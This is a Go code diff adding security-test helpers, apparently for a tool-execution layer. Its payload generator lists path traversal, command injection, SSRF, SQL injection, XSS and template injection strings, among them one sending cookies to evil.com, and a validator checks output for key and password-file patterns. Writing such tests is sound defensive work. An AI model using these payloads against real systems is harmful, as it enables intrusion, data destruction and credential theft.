@@ -609,3 +609,319 @@ func NewSecurityError(code, message string) error {
 		Timestamp: time.Now(),
 	}
 }
+
+// SecurityTestUtils provides utilities for security testing
+type SecurityTestUtils struct {
+	tempDir   string
+	cleanupFn func()
+}
+
+// NewSecurityTestUtils creates a new security test utilities instance
+func NewSecurityTestUtils(t *testing.T) *SecurityTestUtils {
+	tempDir, err := os.MkdirTemp("", "security_test_utils")
+	if err != nil {
+		t.Fatalf("Failed to create temp directory: %v", err)
+	}
+
+	return &SecurityTestUtils{
+		tempDir: tempDir,
+		cleanupFn: func() {
+			os.RemoveAll(tempDir)
+		},
+	}
+}
+
+// Cleanup removes temporary test resources
+func (u *SecurityTestUtils) Cleanup() {
+	if u.cleanupFn != nil {
+		u.cleanupFn()
+	}
+}
+
+// GetTempDir returns the temporary directory path
+func (u *SecurityTestUtils) GetTempDir() string {
+	return u.tempDir
+}
+
+// CreateTestFile creates a test file with specified content
+func (u *SecurityTestUtils) CreateTestFile(t *testing.T, filename, content string) string {
+	filePath := filepath.Join(u.tempDir, filename)
+	
+	// Create directory if needed
+	dir := filepath.Dir(filePath)
+	if err := os.MkdirAll(dir, 0755); err != nil {
+		t.Fatalf("Failed to create directory %s: %v", dir, err)
+	}
+
+	if err := os.WriteFile(filePath, []byte(content), 0644); err != nil {
+		t.Fatalf("Failed to create test file %s: %v", filePath, err)
+	}
+
+	return filePath
+}
+
+// CreateTestSymlink creates a symbolic link for testing
+func (u *SecurityTestUtils) CreateTestSymlink(t *testing.T, linkName, target string) string {
+	linkPath := filepath.Join(u.tempDir, linkName)
+	
+	if err := os.Symlink(target, linkPath); err != nil {
+		t.Skipf("Cannot create symlink (may not be supported): %v", err)
+	}
+
+	return linkPath
+}
+
+// CreateTestDirectory creates a test directory
+func (u *SecurityTestUtils) CreateTestDirectory(t *testing.T, dirName string) string {
+	dirPath := filepath.Join(u.tempDir, dirName)
+	
+	if err := os.MkdirAll(dirPath, 0755); err != nil {
+		t.Fatalf("Failed to create directory %s: %v", dirPath, err)
+	}
+
+	return dirPath
+}
+
+// PayloadGenerator generates various types of malicious payloads for testing
+type PayloadGenerator struct{}
+
+// NewPayloadGenerator creates a new payload generator
+func NewPayloadGenerator() *PayloadGenerator {
+	return &PayloadGenerator{}
+}
+
+// GeneratePathTraversalPayloads generates path traversal attack payloads
+func (g *PayloadGenerator) GeneratePathTraversalPayloads() []string {
+	return []string{
+		"../../../etc/passwd",
+		"..\\..\\..\\windows\\system32\\config\\sam",
+		"..%2f..%2f..%2fetc%2fpasswd",
+		"..%252f..%252f..%252fetc%252fpasswd",
+		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+		"................/etc/passwd",
+		".. /.. /.. /etc/passwd",
+		"~/../../etc/passwd",
+		"./../../etc/passwd",
+		"..///..///..///etc//passwd",
+		"file.txt\x00../../../etc/passwd",
+		"file.txt; cat /etc/passwd",
+		"file.txt && cat /etc/passwd",
+		"file.txt || cat /etc/passwd",
+		"file.txt | cat /etc/passwd",
+		"file.txt & cat /etc/passwd",
+		"file.txt`cat /etc/passwd`",
+		"file.txt$(cat /etc/passwd)",
+		"file.txt\ncat /etc/passwd",
+		"file.txt\rcat /etc/passwd",
+		"file.txt\tcat /etc/passwd",
+	}
+}
+
+// GenerateCommandInjectionPayloads generates command injection payloads
+func (g *PayloadGenerator) GenerateCommandInjectionPayloads() []string {
+	return []string{
+		"; cat /etc/passwd",
+		"&& cat /etc/passwd",
+		"|| cat /etc/passwd",
+		"| cat /etc/passwd",
+		"& cat /etc/passwd",
+		"`cat /etc/passwd`",
+		"$(cat /etc/passwd)",
+		"\ncat /etc/passwd",
+		"\rcat /etc/passwd",
+		"\tcat /etc/passwd",
+		"\x00cat /etc/passwd",
+		"> /etc/passwd",
+		"< /etc/passwd",
+		"${PATH}",
+		"$HOME",
+		"${IFS}cat${IFS}/etc/passwd",
+		"*",
+		"?",
+		"[a-z]*",
+		"\\; cat /etc/passwd",
+		"\"; cat /etc/passwd",
+		"'; cat /etc/passwd",
+		"%3Bcat%20/etc/passwd",
+		"；cat /etc/passwd", // Unicode semicolon
+	}
+}
+
+// GenerateURLInjectionPayloads generates URL injection attack payloads
+func (g *PayloadGenerator) GenerateURLInjectionPayloads() []string {
+	return []string{
+		"javascript:alert('XSS')",
+		"data:text/html,<script>alert('XSS')</script>",
+		"http://evil.com",
+		"https://evil.com",
+		"ftp://evil.com",
+		"file:///etc/passwd",
+		"http://127.0.0.1:8080/admin",
+		"http://localhost/admin",
+		"http://169.254.169.254/metadata",
+		"http://[::1]/admin",
+		"http://0.0.0.0/admin",
+		"http://192.168.1.1/router",
+		"http://10.0.0.1/internal",
+		"http://172.16.0.1/internal",
+	}
+}
+
+// GenerateSQLInjectionPayloads generates SQL injection attack payloads
+func (g *PayloadGenerator) GenerateSQLInjectionPayloads() []string {
+	return []string{
+		"' OR 1=1 --",
+		"' OR '1'='1",
+		"'; DROP TABLE users; --",
+		"1' UNION SELECT null,username,password FROM users --",
+		"admin'--",
+		"admin' #",
+		"admin'/*",
+		"' OR 1=1#",
+		"' OR 1=1/*",
+		"') OR ('1'='1",
+		"' OR 1=1 LIMIT 1 --",
+		"1'; WAITFOR DELAY '00:00:05' --",
+	}
+}
+
+// GenerateXSSPayloads generates XSS attack payloads
+func (g *PayloadGenerator) GenerateXSSPayloads() []string {
+	return []string{
+		"<script>alert('XSS')</script>",
+		"<img src=x onerror=alert('XSS')>",
+		"<svg onload=alert('XSS')>",
+		"<iframe src=javascript:alert('XSS')>",
+		"<body onload=alert('XSS')>",
+		"<input type=text onkeyup=alert('XSS')>",
+		"<a href=javascript:alert('XSS')>click</a>",
+		"javascript:alert('XSS')",
+		"data:text/html,<script>alert('XSS')</script>",
+		"<script>document.location='http://evil.com/'+document.cookie</script>",
+		"<object data='javascript:alert(\"XSS\")'></object>",
+		"<embed src='javascript:alert(\"XSS\")'></embed>",
+	}
+}
+
+// GenerateTemplateInjectionPayloads generates template injection attack payloads
+func (g *PayloadGenerator) GenerateTemplateInjectionPayloads() []string {
+	return []string{
+		"{{7*7}}",
+		"${7*7}",
+		"#{7*7}",
+		"<%= 7*7 %>",
+		"{{config}}",
+		"{{request}}",
+		"{{self}}",
+		"${config}",
+		"${request}",
+		"${self}",
+		"{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+		"${''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}",
+		"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat /etc/passwd\")}",
+	}
+}
+
+// SecurityTestValidator validates security test results
+type SecurityTestValidator struct{}
+
+// NewSecurityTestValidator creates a new security test validator
+func NewSecurityTestValidator() *SecurityTestValidator {
+	return &SecurityTestValidator{}
+}
+
+// ValidateSecurityBlocking validates that security measures are blocking threats
+func (v *SecurityTestValidator) ValidateSecurityBlocking(t *testing.T, result *ToolExecutionResult, err error, expectBlocked bool) {
+	if expectBlocked {
+		if err == nil && result.Success {
+			t.Error("Expected security measure to block the operation")
+		} else {
+			t.Logf("Security measure successfully blocked the operation")
+		}
+	} else {
+		if err != nil {
+			t.Errorf("Unexpected error in allowed operation: %v", err)
+		}
+		if result == nil || !result.Success {
+			t.Error("Expected allowed operation to succeed")
+		}
+	}
+}
+
+// ValidateErrorMessage validates that error messages contain expected content
+func (v *SecurityTestValidator) ValidateErrorMessage(t *testing.T, result *ToolExecutionResult, expectedError string) {
+	if result == nil {
+		t.Error("Expected result to be non-nil for error validation")
+		return
+	}
+
+	if expectedError != "" && !strings.Contains(result.Error, expectedError) {
+		t.Errorf("Expected error containing '%s', got: %s", expectedError, result.Error)
+	}
+}
+
+// ValidateNoDataLeakage validates that no sensitive data is leaked in results
+func (v *SecurityTestValidator) ValidateNoDataLeakage(t *testing.T, result *ToolExecutionResult) {
+	if result == nil {
+		return
+	}
+
+	// Check for common sensitive data patterns
+	sensitivePatterns := []string{
+		"password",
+		"secret",
+		"token",
+		"key",
+		"private",
+		"confidential",
+		"/etc/passwd",
+		"/etc/shadow",
+		"id_rsa",
+		"id_dsa",
+		"SSH PRIVATE KEY",
+		"BEGIN RSA PRIVATE KEY",
+		"BEGIN DSA PRIVATE KEY",
+		"BEGIN EC PRIVATE KEY",
+		"BEGIN OPENSSH PRIVATE KEY",
+		"BEGIN PGP PRIVATE KEY",
+	}
+
+	// Convert result to string for pattern matching
+	resultStr := fmt.Sprintf("%+v", result)
+	resultStr = strings.ToLower(resultStr)
+
+	for _, pattern := range sensitivePatterns {
+		if strings.Contains(resultStr, strings.ToLower(pattern)) {
+			t.Errorf("Potential sensitive data leakage detected: %s", pattern)
+		}
+	}
+}
+
+// CreateMockExecutor creates a mock executor for testing
+func (h *SecurityTestUtils) CreateMockExecutor(shouldSucceed bool, resultData interface{}) ToolExecutor {
+	return &mockExecutorForUtils{
+		shouldSucceed: shouldSucceed,
+		resultData:    resultData,
+	}
+}
+
+// mockExecutorForUtils is a mock implementation of ToolExecutor for testing
+type mockExecutorForUtils struct {
+	shouldSucceed bool
+	resultData    interface{}
+}
+
+func (m *mockExecutorForUtils) Execute(ctx context.Context, params map[string]interface{}) (*ToolExecutionResult, error) {
+	if m.shouldSucceed {
+		return &ToolExecutionResult{
+			Success: true,
+			Data:    m.resultData,
+		}, nil
+	} else {
+		return &ToolExecutionResult{
+			Success: false,
+			Error:   "mock execution failed",
+		}, nil
+	}
+}
